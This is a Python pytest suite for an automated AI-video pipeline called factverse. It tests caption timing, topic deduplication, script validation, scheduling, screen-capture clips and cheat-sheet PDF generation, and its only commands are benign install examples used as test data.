"""Tests for the pure, deterministic logic — the pieces that silently corrupt
content when they regress (ranking, dedup, caption timing, script validation,
policy gates). Run:  python -m pytest tests/ -q
"""
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from factverse import captions
from factverse.intelligence import signal_engine
from factverse import ai_pipeline as ap
from factverse import deliverable


# --------------------------------------------------------------- captions
def test_ts_never_emits_60_seconds():
    # 59.999s used to format as the invalid "0:00:60.00"
    assert captions._ts(59.999) == "0:01:00.00"
    assert captions._ts(0) == "0:00:00.00"
    assert captions._ts(3661.5) == "1:01:01.50"


def test_build_ass_groups_words(tmp_path):
    words = [(0.0, 0.4, "hello"), (0.45, 0.9, "world"), (3.0, 3.5, "later")]
    out = captions.build_ass(words, str(tmp_path / "t.ass"))
    text = Path(out).read_text(encoding="utf-8")
    # the >0.7s gap must split into two Dialogue lines
    assert text.count("Dialogue:") == 2
    assert "\\k" in text


# --------------------------------------------------------------- ranking
def test_is_used_short_strings_do_not_overblock():
    used = {"ai"}  # a polluted/short state entry must not block everything
    assert not signal_engine._is_used("OpenAI launches a new agent platform", used)
    assert signal_engine._is_used("ai", used)  # exact match still blocks


def test_is_used_real_titles_block_substrings():
    used = {signal_engine._norm("OpenAI launches new agent platform")}
    assert signal_engine._is_used("OpenAI Launches New Agent Platform!", used)


# --------------------------------------------------------------- script contract
def test_validate_script_rejects_thin_scripts():
    assert ap._validate_script({"scenes": [{"narration": "x", "visual_query": "y"}]}, "t") is None
    assert ap._validate_script(None, "t") is None


def test_validate_script_fills_defaults_and_sanitizes():
    s = ap._validate_script(
        {"title": "Best <AI> Video" + "!" * 200,
         "scenes": [{"narration": f"sentence {i}", "visual_query": "server room"} for i in range(6)]},
        "fallback", "https://example.com/story")
    assert s is not None
    assert "<" not in s["title"] and len(s["title"]) <= 95
    assert "https://example.com/story" in s["description"]
    assert "#AI" in s["description"]
    assert any(t == "ai" for t in s["tags"])
    assert s["scenes"][0]["scene_num"] == 1


# --------------------------------------------------------------- policy gate
def test_verbatim_overlap_detects_copying():
    src = "the quick brown fox jumps over the lazy dog every single day without fail in the morning"
    narration_copy = src + " and more words here to extend the sample text for shingles"
    assert ap.verbatim_overlap(narration_copy, src) > 0.3
    rewritten = ("a fast auburn fox regularly leaps across a sleepy hound "
                 "each morning according to the report we reviewed today entirely rephrased")
    assert ap.verbatim_overlap(rewritten, src) == 0.0


# --------------------------------------------------------------- scene sync
def test_scene_durations_tracks_word_weight():
    script = {"scenes": [{"narration": "one two three four five six seven eight nine ten"},
                         {"narration": "just two"}]}
    # 12 words spoken over 12s: 10 words -> ~10s, 2 words -> ~2s
    words = [(i * 1.0, i * 1.0 + 0.8, f"w{i}") for i in range(12)]
    # need >=20 words for the sync to engage; pad the scenes and words
    script["scenes"] *= 2
    words = [(i * 1.0, i * 1.0 + 0.8, f"w{i}") for i in range(24)]
    durs = ap.scene_durations(script, words, 24.0)
    assert durs is not None and len(durs) == 4
    assert abs(sum(durs) - 24.0) < 1.5
    assert durs[0] > durs[1]  # 10-word scene runs longer than the 2-word scene


def test_scene_durations_falls_back_on_thin_data():
    assert ap.scene_durations({"scenes": [{"narration": "hi"}]}, [(0, 1, "hi")], 1.0) is None


# --------------------------------------------------------------- chapters
def test_build_chapters_offline(monkeypatch):
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: None)
    scenes = [{"narration": f"scene number {i} talks about things"} for i in range(12)]
    starts = [i * 45.0 for i in range(12)]
    ch = ap.build_chapters({"scenes": scenes}, starts, shift=2.6)
    assert ch.startswith("Chapters:\n0:00 ")
    lines = ch.splitlines()[1:]
    assert len(lines) >= 3
    # second chapter reflects the cold-open shift (start + 2.6s intro)
    assert lines[1].split(" ")[0] != "0:00"


def test_build_chapters_needs_enough_scenes(monkeypatch):
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: None)
    assert ap.build_chapters({"scenes": [{"narration": "x"}] * 4}, [0, 1, 2, 3], 2.6) == ""


# --------------------------------------------------------------- near-duplicate guard
def test_too_similar_catches_reworded_story():
    used = {signal_engine._norm("AI Development Gets Scalable: NVIDIA & Hugging Face Partners")}
    assert signal_engine._is_used("AI Scale-Up: NVIDIA & Hugging Face Forge New Path", used)
    assert not signal_engine._is_used("Google Releases a Weather Prediction Model", used)


# --------------------------------------------------------------- state merge
def test_state_merge_unions_lists_and_logs():
    from factverse import state_merge as sm
    ours = '["topic a", "topic b"]'
    theirs = '["topic b", "topic c"]'
    merged = sm.merge_file("used_topics.json", ours, theirs)
    assert set(__import__("json").loads(merged)) == {"topic a", "topic b", "topic c"}

    log_a = '[{"timestamp": "1", "title": "x"}]'
    log_b = '[{"timestamp": "2", "title": "y"}, {"timestamp": "1", "title": "x"}]'
    merged = sm.merge_file("output/production_log.json", log_a, log_b)
    assert len(__import__("json").loads(merged)) == 2

    jl = sm.merge_file("state/runs.jsonl", '{"a":1}\n{"b":2}\n', '{"b":2}\n{"c":3}\n')
    assert jl.count("\n") == 3

    counts = sm.merge_file("state/failed_topics.json", '{"t": 2}', '{"t": 1, "u": 1}')
    d = __import__("json").loads(counts)
    assert d["t"] == 2 and d["u"] == 1


# --------------------------------------------------------------- distribution rules
def test_slots_are_spaced_and_future():
    import datetime as dt
    from factverse import scheduling as sch
    base = dt.datetime(2026, 7, 21, 13, 5, tzinfo=dt.timezone.utc)  # 18:35 IST
    slots = sch.next_slots(3, after=base)
    assert len(slots) == 3
    times = [dt.datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=dt.timezone.utc)
             for s in slots]
    assert times[0] > base
    for a, b in zip(times, times[1:]):
        assert (b - a).total_seconds() >= 4 * 3600


def test_distribution_violations_raise():
    import datetime as dt
    import pytest
    from factverse import scheduling as sch
    t0 = dt.datetime(2026, 7, 21, 7, 0, tzinfo=sch.IST)
    with pytest.raises(sch.PipelineViolation):
        sch.validate_distribution([t0, t0 + dt.timedelta(hours=1)])   # 1h gap
    with pytest.raises(sch.PipelineViolation):
        sch.validate_distribution([t0 + dt.timedelta(hours=5 * i) for i in range(5)])  # 5 shorts
    with pytest.raises(sch.PipelineViolation):
        sch.validate_shorts_batch(["a.mp4", "b.mp4"], ["hook one", ""])  # raw slice


def test_dialogue_segments_grouping():
    script = {"scenes": [
        {"narration": "hook line", "speaker": "a"},
        {"narration": "more host", "speaker": "a"},
        {"narration": "the facts", "speaker": "b"},
        {"narration": "back to host", "speaker": "a"},
    ]}
    segs = ap._dialogue_segments(script, "")
    assert segs is not None and len(segs) == 3
    assert "hook line" in segs[0][1] and "more host" in segs[0][1]
    assert segs[1][1] == "the facts"


def test_dialogue_segments_none_for_monologue():
    assert ap._dialogue_segments({"scenes": [{"narration": "x"}] * 6}, "") is None


# =============================================================== v3: utility pivot
# --------------------------------------------------------------- caption force-align
def test_correct_words_fixes_one_to_one_mistranscription():
    # whisper misheard the proper noun; the script is ground truth for spelling
    words = [(0.0, 0.4, "Hoppogja's"), (0.5, 0.9, "video"), (1.0, 1.4, "went"), (1.5, 1.9, "viral")]
    out = captions.correct_words(words, "Haapoja's video went viral.")
    assert out[0] == (0.0, 0.4, "Haapoja's")            # text fixed, timing untouched
    assert [w for (_, _, w) in out] == ["Haapoja's", "video", "went", "viral"]


def test_correct_words_keeps_unequal_blocks():
    # script "14MB" heard as two tokens: unequal alignment must keep whisper's text
    words = [(0.0, 0.4, "14"), (0.4, 0.9, "megabytes"), (1.0, 1.4, "model")]
    out = captions.correct_words(words, "14MB model")
    assert [w for (_, _, w) in out] == ["14", "megabytes", "model"]


def test_correct_words_adopts_script_casing():
    out = captions.correct_words([(0.0, 1.0, "openai")], "OpenAI")
    assert out[0][2] == "OpenAI"
    assert captions.correct_words([], "text") == []


# --------------------------------------------------------------- format decision
def _sig(kind="news"):
    return {"title": "OpenAI ships a new agent model", "url": "https://x.test/a", "source": "s",
            "score": 50.0, "published": "", "kind": kind, "niche": True, "fit_score": 50.0}


def test_decide_format_news_needs_8(monkeypatch):
    import datetime as dt
    monday = dt.date(2026, 8, 17)
    monkeypatch.setattr(ap.fv, "flag", lambda name, default=False: name == "tool_format")
    monkeypatch.setattr(ap, "viral_pick", lambda r: (r[0], 7.5, "angle", "hook"))
    fmt, _ = ap.decide_format(None, [_sig("tool")], today=monday)
    assert fmt == "tool"                                 # 7.5 no longer clears the bar
    monkeypatch.setattr(ap, "viral_pick", lambda r: (r[0], 8.2, "angle", "hook"))
    fmt, hint = ap.decide_format(None, [_sig("tool")], today=monday)
    assert fmt == "news" and hint[1] == 8.2


def test_decide_format_tool_lane_gated_by_flag(monkeypatch):
    import datetime as dt
    monday = dt.date(2026, 8, 17)
    monkeypatch.setattr(ap, "viral_pick", lambda r: None)
    monkeypatch.setattr(ap.fv, "flag", lambda name, default=False: False)
    fmt, _ = ap.decide_format(None, [_sig("tool")], today=monday)
    assert fmt == "evergreen"                            # flag off -> v2 behavior intact
    monkeypatch.setattr(ap.fv, "flag", lambda name, default=False: name == "tool_format")
    fmt, _ = ap.decide_format(None, [_sig("news")], today=monday)
    assert fmt == "evergreen"                            # flag on but no tool signal
    fmt, hint = ap.decide_format("tool", [])
    assert fmt == "tool" and hint is None                # forced format honored


def test_decide_format_sunday_keeps_roundup(monkeypatch):
    import datetime as dt
    monkeypatch.setattr(ap, "viral_pick", lambda r: (r[0], 9.9, "a", "h"))
    fmt, _ = ap.decide_format(None, [_sig("tool")], today=dt.date(2026, 8, 16))
    assert fmt == "roundup"


# --------------------------------------------------------------- deliverable contract
def test_validate_script_normalizes_deliverable():
    base = {"scenes": [{"narration": f"s {i}", "visual_query": "code"} for i in range(6)]}
    s = ap._validate_script({**base, "deliverable": {"kind": "command", "text": "pip install x",
                                                     "url": "https://g.test/r"}}, "t")
    assert s["deliverable"] == {"kind": "command", "text": "pip install x", "url": "https://g.test/r"}
    s = ap._validate_script({**base, "deliverable": {"text": "   "}}, "t")
    assert s["deliverable"] is None                      # blank text -> no deliverable
    s = ap._validate_script(dict(base), "t")
    assert s["deliverable"] is None                      # news/evergreen scripts unaffected


# --------------------------------------------------------------- length is a cap now
def test_enforce_max_length_cuts_padded_scripts(monkeypatch):
    long_script = {"title": "T", "thumb_text": "X", "description": "d", "tags": [],
                   "source_url": "", "format": "news",
                   "scenes": [{"narration": " ".join(["word"] * 100), "visual_query": "v"}
                              for _ in range(10)]}                     # 1000 words
    tight = {"title": "T", "thumb_text": "X", "description": "d", "tags": [],
             "scenes": [{"narration": " ".join(["word"] * 80), "visual_query": "v"}
                        for _ in range(8)]}                            # 640 words
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: dict(tight))
    out = ap.enforce_max_length(long_script, 900)
    assert sum(len(sc["narration"].split()) for sc in out["scenes"]) == 640
    assert out["format"] == "news"                       # metadata carried across the pass


def test_enforce_max_length_noop_under_cap(monkeypatch):
    called = []
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: called.append(1))
    s = {"scenes": [{"narration": "one two three four five", "visual_query": "v"}] * 5, "title": "t"}
    assert ap.enforce_max_length(s, 900) is s and not called


# === v3-B: original-visuals engine (screencap) ===============================
from factverse import screencap
from factverse import thumbnail as thumb_mod


# --------------------------------------------------------------- segment planning
def test_segment_plan_covers_recording_sequentially():
    plan = screencap.segment_plan(120.0, 12)
    assert len(plan) == 12 and plan[0] == (0.0, 10.0)
    starts = [s for s, _ in plan]
    assert starts == sorted(starts)                      # video progresses down the page
    assert abs(sum(l for _, l in plan) - 120.0) < 0.1    # nothing recorded is wasted


def test_segment_plan_short_recording_yields_fewer_chunks():
    plan = screencap.segment_plan(10.0, 12)
    assert len(plan) == 2                                # 4s minimum respected
    assert all(l >= screencap.MIN_SEG for _, l in plan)


def test_segment_plan_degenerate_inputs():
    assert screencap.segment_plan(0, 5) == []
    assert screencap.segment_plan(60, 0) == []


def test_estimate_video_seconds_tracks_words_and_clamps():
    assert screencap.estimate_video_seconds({"scenes": []}) == screencap.REC_MIN
    est = screencap.estimate_video_seconds({"scenes": [{"narration": " ".join(["w"] * 450)}]})
    assert est == 450 / screencap.WPS
    long = {"scenes": [{"narration": " ".join(["w"] * 2000)}]}
    assert screencap.estimate_video_seconds(long) == screencap.REC_MAX


# --------------------------------------------------------------- ffmpeg args (built, never run)
def test_trim_args_seek_past_blank_head():
    args = screencap._trim_args("in.webm", "out.mp4")
    assert args.index("-ss") < args.index("-i")          # page-load blank is removed
    assert args[args.index("-ss") + 1] == str(screencap.HEAD_TRIM)


def test_cut_args_carry_start_and_length():
    args = screencap._cut_args("rec.mp4", "chunk.mp4", 12.5, 8.0)
    assert args[args.index("-ss") + 1] == "12.5"
    assert args[args.index("-t") + 1] == "8.0"


# --------------------------------------------------------------- capture contract
def test_capture_rejects_missing_url_or_scenes():
    assert screencap.capture({"scenes": [], "source_url": "https://x.test"}) is None
    assert screencap.capture({"scenes": [{"narration": "n"}], "source_url": ""}) is None


def test_capture_fails_soft_when_recorder_dies(monkeypatch, tmp_path):
    def boom(*a, **k):
        raise RuntimeError("browser gone")
    monkeypatch.setattr(screencap.fv, "TEMP", tmp_path)
    monkeypatch.setattr(screencap, "_record_page", boom)
    s = {"scenes": [{"narration": "n"}] * 6, "source_url": "https://github.com/x/y"}
    assert screencap.capture(s) is None                  # caller falls back to stock


def test_capture_maps_chunks_onto_scenes(monkeypatch, tmp_path):
    monkeypatch.setattr(screencap.fv, "TEMP", tmp_path)
    monkeypatch.setattr(screencap, "_record_page",
                        lambda url, out, t: (str(Path(out) / "rec.webm"),
                                             str(Path(out) / "page.png"), 3.1))
    seen = []
    def fake_ffmpeg(args, timeout=600):
        seen.append(args)
        Path(args[-1]).write_bytes(b"0" * 2000)
        return True
    monkeypatch.setattr(screencap, "_ffmpeg", fake_ffmpeg)
    monkeypatch.setattr(screencap, "_probe_duration", lambda p: 120.0)
    s = {"scenes": [{"narration": "n"}] * 12, "source_url": "https://github.com/x/y"}
    out = screencap.capture(s)
    assert out and len(out["scene_clips"]) == 12
    assert all(len(c) == 1 for c in out["scene_clips"])  # same shape as step3_download
    assert out["scene_clips"][0][0].endswith("chunk_000.mp4")
    assert out["scene_clips"][-1][0].endswith("chunk_011.mp4")
    assert seen[0][seen[0].index("-ss") + 1] == "3.1"   # measured head, not the constant


def test_capture_shares_chunks_when_recording_is_short(monkeypatch, tmp_path):
    monkeypatch.setattr(screencap.fv, "TEMP", tmp_path)
    monkeypatch.setattr(screencap, "_record_page",
                        lambda url, out, t: (str(Path(out) / "rec.webm"), "", 2.5))
    def fake_ffmpeg(args, timeout=600):
        Path(args[-1]).write_bytes(b"0" * 2000)
        return True
    monkeypatch.setattr(screencap, "_ffmpeg", fake_ffmpeg)
    monkeypatch.setattr(screencap, "_probe_duration", lambda p: 10.0)   # only 2 chunks
    s = {"scenes": [{"narration": "n"}] * 12, "source_url": "",
         "deliverable": {"kind": "repo", "text": "x", "url": "https://github.com/x/y"}}
    out = screencap.capture(s)                           # deliverable URL is the fallback
    assert out and len(out["scene_clips"]) == 12
    assert out["scene_clips"][5][0].endswith("chunk_000.mp4")
    assert out["scene_clips"][6][0].endswith("chunk_001.mp4")
    assert out["screenshot"] == ""                       # no screenshot -> thumb falls back


# --------------------------------------------------------------- code cards
def test_render_code_card_png_real_render(tmp_path):
    out = tmp_path / "card.png"
    res = screencap.render_code_card_png(
        {"kind": "command", "text": "pip install factverse && factverse run demo",
         "url": "https://github.com/x/y"}, str(out))
    assert res and out.exists() and out.stat().st_size > 5000


def test_render_code_card_requires_text(tmp_path):
    assert screencap.render_code_card_png({"kind": "command", "text": "  "},
                                          str(tmp_path / "c.png")) is None


def test_inject_code_card_hits_payoff_scenes(monkeypatch):
    monkeypatch.setattr(screencap, "make_code_card", lambda dl, out, seconds=6.0: "CARD.mp4")
    script = {"deliverable": {"kind": "command", "text": "pip install x", "url": "u"},
              "scenes": [{"narration": "hook"},
                         {"narration": "you install it with one command"},
                         {"narration": "uses"},
                         {"narration": "the exact command is in the description"}]}
    clips = [["a.mp4"], ["b.mp4"], ["c.mp4"], ["d.mp4"]]
    assert screencap.inject_code_card(script, clips) == 2
    assert clips[-1][0] == "CARD.mp4" and clips[1][0] == "CARD.mp4"


def test_inject_code_card_skips_hook_and_replaces_stat_card(monkeypatch):
    monkeypatch.setattr(screencap, "make_code_card", lambda dl, out, seconds=6.0: "CARD.mp4")
    script = {"deliverable": {"kind": "command", "text": "pip install x", "url": "u"},
              "scenes": [{"narration": "install it now"},           # hook mentions install
                         {"narration": "what it is"},
                         {"narration": "the command is in the description"}]}
    clips = [["a.mp4"], ["b.mp4"], ["temp/statcard_02.mp4", "c.mp4"]]
    assert screencap.inject_code_card(script, clips) == 1   # hook never gets the card
    assert clips[0] == ["a.mp4"] and clips[1] == ["b.mp4"]
    assert clips[2] == ["CARD.mp4", "c.mp4"]             # stat card replaced, not stacked


def test_inject_code_card_noop_without_deliverable(monkeypatch):
    called = []
    monkeypatch.setattr(screencap, "make_code_card",
                        lambda *a, **k: called.append(1) or "C")
    clips = [["a"]]
    assert screencap.inject_code_card({"deliverable": None, "scenes": []}, clips) == 0
    assert not called and clips == [["a"]]


# --------------------------------------------------------------- tool thumbnail
def test_make_tool_thumb_from_screenshot(tmp_path):
    from PIL import Image
    shot = tmp_path / "page.png"
    Image.new("RGB", (1920, 1080), (30, 34, 44)).save(shot)
    out = tmp_path / "thumb.jpg"
    res = thumb_mod.make_tool_thumb(str(shot), "free ai tool", str(out))
    assert res and out.exists() and out.stat().st_size > 5000


def test_make_tool_thumb_missing_screenshot(tmp_path):
    assert thumb_mod.make_tool_thumb(str(tmp_path / "nope.png"), "x",
                                     str(tmp_path / "o.jpg")) is None


# --------------------------------------------------------------- rewrite passes keep v3 keys
def _tool_script(words_per_scene: int, n: int = 6) -> dict:
    return {"title": "T", "thumb_text": "X", "description": "d", "tags": [], "format": "tool",
            "source_url": "https://github.com/x/y", "filter_segment": True,
            "deliverable": {"kind": "command", "text": "pip install x", "url": "https://github.com/x/y"},
            "scenes": [{"narration": " ".join(["word"] * words_per_scene), "visual_query": "v"}
                       for _ in range(n)]}


def test_rewrite_passes_carry_deliverable_and_filter(monkeypatch):
    # the LLM never sees deliverable/filter_segment, so it cannot echo them back
    rewrite = {"title": "T", "thumb_text": "X", "description": "new", "tags": [],
               "scenes": [{"narration": " ".join(["word"] * 100), "visual_query": "v"}
                          for _ in range(6)]}                               # 600 words
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: dict(rewrite))
    for run_pass, wps in ((ap.critique_pass, 110),                 # 660 -> 600: accepted cut
                          (lambda s: ap.enforce_length(s, 5000), 50),   # 300 -> 600: expanded
                          (lambda s: ap.enforce_max_length(s, 100), 110)):  # 660 -> 600: tightened
        out = run_pass(_tool_script(wps))
        assert out["description"].startswith("new"), "pass should have applied"
        assert out["deliverable"]["text"] == "pip install x"
        assert out["filter_segment"] is True and out["format"] == "tool"
        assert out["source_url"] == "https://github.com/x/y"
    assert "deliverable" in ap._CARRY and "filter_segment" in ap._CARRY


def test_place_description_blocks_is_idempotent(monkeypatch):
    monkeypatch.setattr(ap.fv, "setting", lambda name, default=None: "" if name == "promo_block" else default)
    s = _tool_script(10)
    ap.place_description_blocks(s)
    ap.place_description_blocks(s)                       # advice-gate path calls it again
    assert s["description"].count("🔧 Try it yourself") == 1
    assert s["description"].count("📄 Free 1-page cheat sheet") == 1
    assert "pip install x" in s["description"] and "https://github.com/x/y" in s["description"]


# === v3-C: cheat sheet + description blocks ==================================
import datetime as _dt
from factverse import deliverable as dlv


def _settings(**over):
    return lambda name, default=None: over.get(name, default)


def test_slug_and_pdf_name_are_deterministic():
    assert dlv.slug("Hello, World!  Tool v2") == "hello-world-tool-v2"
    assert len(dlv.slug("x" * 100)) == 40
    assert dlv.slug("???") == "tool"
    assert dlv.pdf_name("Hello World", _dt.date(2026, 8, 22)) == "2026-08-22-hello-world.pdf"


def test_public_url_uses_config_base(monkeypatch):
    monkeypatch.setattr(dlv.fv, "setting", _settings(deliverable_base_url="https://x.test/site/"))
    assert dlv.public_url("a.pdf") == "https://x.test/site/tools/a.pdf"
    monkeypatch.setattr(dlv.fv, "setting", _settings())
    assert dlv.public_url("a.pdf") == dlv.DEFAULT_BASE_URL + "/tools/a.pdf"


def test_description_blocks_land_after_hook_in_order(monkeypatch):
    monkeypatch.setattr(ap.fv, "setting", _settings(promo_block="⭐ Promo: https://aff.test/x"))
    s = _tool_script(10)
    s["description"] = "Hook line with keyword.\n\nBody paragraph two.\n\nSource: u\n\n#AI"
    ap.place_description_blocks(s)
    d = s["description"]
    order = [d.index("Hook line"), d.index("🔧 Try it yourself"), d.index("pip install x"),
             d.index("📄 Free 1-page cheat sheet: "), d.index("⭐ Promo"), d.index("Body paragraph two")]
    assert order == sorted(order)
    # the PDF name is still what run() writes; the description links the PAGE (v3-F.1 #5)
    assert s["cheat_sheet"].endswith("-t.pdf") and site.page_name(s["cheat_sheet"]) in d
    ap.place_description_blocks(s)                       # idempotent incl. promo
    assert d == s["description"]


def test_promo_block_empty_never_appears_and_non_tool_placement(monkeypatch):
    monkeypatch.setattr(ap.fv, "setting", _settings(promo_block=""))
    news = {"format": "news", "description": "Hook.\n\nBody.", "deliverable": None}
    ap.place_description_blocks(news)
    assert news["description"] == "Hook.\n\nBody." and "cheat_sheet" not in news
    monkeypatch.setattr(ap.fv, "setting", _settings(promo_block="PROMO"))
    ap.place_description_blocks(news)
    assert news["description"] == "Hook.\n\nPROMO\n\nBody."   # after paragraph 1


def test_description_clamped_before_blocks(monkeypatch):
    monkeypatch.setattr(ap.fv, "setting", _settings(promo_block=""))
    s = _tool_script(10)
    s["description"] = "Hook.\n\n" + "x" * 6000
    ap.place_description_blocks(s)
    assert len(s["description"]) < 4400 and "🔧 Try it yourself" in s["description"]


def test_cheat_sheet_name_is_carried_across_rewrites():
    assert "cheat_sheet" in ap._CARRY


def test_fallback_sheet_is_the_deliverable():
    assert dlv.fallback_sheet(_tool_script(5))["steps"] == ["pip install x"]
    assert dlv.fallback_sheet({"deliverable": None})["steps"] == []


def test_extract_sheet_validates_llm_output(monkeypatch):
    monkeypatch.setattr(dlv.llm, "generate_json", lambda *a, **k: {
        "what": "  A   tool.  ", "steps": ["pip install x", ""], "uses": ["a", "b", "c", "d"], "skip_if": "no"})
    sh = dlv.extract_sheet(_tool_script(5))
    assert sh == {"what": "A tool.", "steps": ["pip install x"], "uses": ["a", "b", "c"], "skip_if": "no"}
    monkeypatch.setattr(dlv.llm, "generate_json", lambda *a, **k: None)
    assert dlv.extract_sheet(_tool_script(5)) is None


def test_build_pdf_real_render_single_page(tmp_path):
    out = tmp_path / "sheet.pdf"
    sheet = {"what": "MarkItDown converts Office files and PDFs to Markdown. Built by Microsoft.",
             "steps": ["pip install markitdown", "markitdown report.pdf -o report.md"],
             "uses": ["Feed a 200-page PDF to an LLM", "Turn slide decks into notes", "Index a docs folder"],
             "skip_if": "You need pixel-perfect layout preservation."}
    res = dlv.build_pdf(_tool_script(5), sheet, str(out), video_url="https://youtu.be/abc")
    assert res and out.stat().st_size > 5000
    import re as _re
    data = out.read_bytes()
    assert len(_re.findall(rb"/Type\s*/Page[^s]", data)) == 1   # exactly one page


def test_make_cheat_sheet_without_llm_uses_fallback(monkeypatch, tmp_path):
    monkeypatch.setattr(dlv, "TOOLS_DIR", tmp_path)
    monkeypatch.setattr(dlv.llm, "generate_json", lambda *a, **k: None)
    captured = {}
    def fake_build(script, sheet, out, video_url=""):
        captured.update(sheet=sheet, out=out, video_url=video_url)
        Path(out).write_bytes(b"%PDF-1.4 fake" + b"0" * 2000)
        return out
    monkeypatch.setattr(dlv, "build_pdf", fake_build)
    s = _tool_script(5)
    s["cheat_sheet"] = "2026-08-22-t.pdf"
    res = dlv.make_cheat_sheet(s, video_url="https://youtu.be/v")
    assert res and Path(res).name == "2026-08-22-t.pdf"
    assert captured["sheet"]["steps"] == ["pip install x"] and captured["video_url"] == "https://youtu.be/v"


def test_extract_sheet_coerces_string_lists(monkeypatch):
    # the LLM returns a bare string often enough; iterating one yields CHARACTERS
    monkeypatch.setattr(dlv.llm, "generate_json", lambda *a, **k: {
        "what": "x", "steps": "pip install x\nmarkitdown a.pdf", "uses": "only one", "skip_if": ""})
    sh = dlv.extract_sheet(_tool_script(5))
    assert sh["steps"] == ["pip install x", "markitdown a.pdf"]
    assert sh["uses"] == ["only one"]
    monkeypatch.setattr(dlv.llm, "generate_json", lambda *a, **k: {"steps": 42, "uses": None})
    assert dlv.extract_sheet(_tool_script(5))["steps"] == ["pip install x"]   # falls back


def test_build_pdf_hard_wraps_unbreakable_commands(tmp_path):
    long_cmd = "pip install git+https://github.com/some-org/a-really-long-repository-name@v1.2.3#egg=pkg"
    out = tmp_path / "long.pdf"
    assert dlv.build_pdf(_tool_script(5), {"what": "", "steps": [long_cmd], "uses": [], "skip_if": ""},
                         str(out))
    from reportlab.lib.utils import simpleSplit
    rows = simpleSplit(long_cmd, "Courier", 11, 499)
    assert any(len(r) > dlv._MONO_COLS for r in rows)      # simpleSplit alone overflows
    assert len(long_cmd[:dlv._MONO_COLS]) == dlv._MONO_COLS


def test_long_command_is_not_cut_mid_line_and_stays_one_page(tmp_path):
    """The wrapped rows used to be sliced [:2], so a 152-char docker line shipped as
    '... ollama/ollama serve && docker' — still copy-pasteable, no longer valid.
    A deliverable may be 300 chars (_validate_script), so this is the normal case."""
    import re as _re
    from reportlab.lib.utils import simpleSplit
    cmd = ("docker run -d -v ollama:/root/.ollama -p 11434:11434 --name ollama "
           "ollama/ollama serve && docker exec -it ollama ollama pull llama3.1:8b-instruct-q4_K_M")
    assert len(simpleSplit(cmd, "Courier", 11, 499)) > 2, "must actually overflow two rows"
    out = tmp_path / "long.pdf"
    assert dlv.build_pdf(_tool_script(5),
                         {"what": "w", "steps": [cmd], "uses": ["a", "b", "c"], "skip_if": "s"},
                         str(out), video_url="https://youtu.be/abc")
    assert len(_re.findall(rb"/Type\s*/Page[^s]", out.read_bytes())) == 1

    # and an overflowing sheet says it was cut instead of ending mid-command
    over = tmp_path / "over.pdf"
    assert dlv.build_pdf(_tool_script(5),
                         {"what": "w", "steps": [f"step{i} " + "y" * 120 for i in range(5)],
                          "uses": ["a", "b", "c"], "skip_if": "s"}, str(over))
    assert len(_re.findall(rb"/Type\s*/Page[^s]", over.read_bytes())) == 1


def test_insert_after_hook_handles_manufactured_blank_line():
    # _validate_script appends "\n\nSource: ..." — the block must not land below the body
    d = ap._insert_after_hook("Hook.\nBody two.\nBody three.\n\nSource: u", "BLOCK")
    assert d.startswith("Hook.\n\nBLOCK\n\nBody two.")
    assert ap._insert_after_hook("\n\nHook.\n\nBody.", "BLOCK").startswith("Hook.\n\nBLOCK")
    assert ap._insert_after_hook("Only one line.", "BLOCK") == "Only one line.\n\nBLOCK"


def test_cheat_sheet_link_only_when_a_pdf_will_be_written(monkeypatch):
    monkeypatch.setattr(ap.fv, "setting", _settings())
    ever = {"format": "evergreen", "description": "Hook.\n\nBody.",
            "deliverable": {"kind": "command", "text": "pip install x", "url": "u"}}
    ap.place_description_blocks(ever)                    # make_cheat_sheet skips non-tool
    assert "cheat_sheet" not in ever and "📄" not in ever["description"]
    assert "🔧 Try it yourself" in ever["description"]


def test_mangled_block_is_repaired_not_trusted(monkeypatch):
    monkeypatch.setattr(ap.fv, "setting", _settings())
    s = _tool_script(10)
    ap.place_description_blocks(s)
    good = s["description"]
    # an LLM rewrite echoes the block back without the cheat-sheet line
    s["description"] = good.replace("\n📄 Free 1-page cheat sheet: "
                                    + dlv.public_url(s["cheat_sheet"]), "")
    ap.place_description_blocks(s)
    assert s["description"].count("🔧 Try it yourself") == 1
    # link == the page we write (v3-F.1 #5)
    assert site.public_url(site.page_name(s["cheat_sheet"])) in s["description"]


def test_make_cheat_sheet_fails_soft(monkeypatch, tmp_path):
    monkeypatch.setattr(dlv, "TOOLS_DIR", tmp_path)
    monkeypatch.setattr(dlv, "build_pdf", lambda *a, **k: None)
    assert dlv.make_cheat_sheet(_tool_script(5)) is None


def test_sheet_for_survives_a_raising_extraction():
    """v3-F.1: the module promises the sheet still ships with title + deliverable when
    extraction fails. extract_sheet returning None took that path; extract_sheet RAISING
    used to skip it and lose the whole PDF — and now also the page."""
    import factverse.deliverable as d
    real = d.extract_sheet
    try:
        d.extract_sheet = lambda s: (_ for _ in ()).throw(RuntimeError("boom"))
        sheet = d.sheet_for(_tool_script(5))
    finally:
        d.extract_sheet = real
    assert isinstance(sheet, dict)
    assert sheet["steps"] == [_tool_script(5)["deliverable"]["text"]]


# --------------------------------------------------------------- grounding + filter fix
def test_tool_grounding_prefers_the_hf_model_card(monkeypatch):
    """The hub page is a JS shell whose readable text is inlined tokenizer JSON —
    and it is LONG, so the old `if not grounding` repair could never fire and the
    model card was never read. The card must be asked for first."""
    calls = []

    def fake_fetch(u, limit=4000):
        calls.append(u)
        return "REAL MODEL CARD. " * 40 if u.endswith("README.md") else "junk " * 1000

    monkeypatch.setattr(ap, "fetch_text", fake_fetch)
    monkeypatch.setattr(ap.llm, "generate_json", lambda *a, **k: None)
    ap.script_tool({"title": "T", "source": "hf", "url": "https://huggingface.co/org/model"})
    assert calls and calls[0].endswith("/raw/main/README.md")
    assert len(calls) == 1, "the card answered; the junk page must not be fetched at all"


def test_gated_hf_model_is_rejected_not_grounded_on_the_js_shell(monkeypatch):
    """A gated or README-less model 401s on /raw/main/README.md. Falling back to the
    page would ground the whole video in the shell's inlined chat_template JSON —
    long enough to look real, so every claim in the video would be invented."""
    calls = []

    def fake_fetch(u, limit=4000):
        calls.append(u)
        return "" if u.endswith("README.md") else "{jinja chat_template junk} " * 300

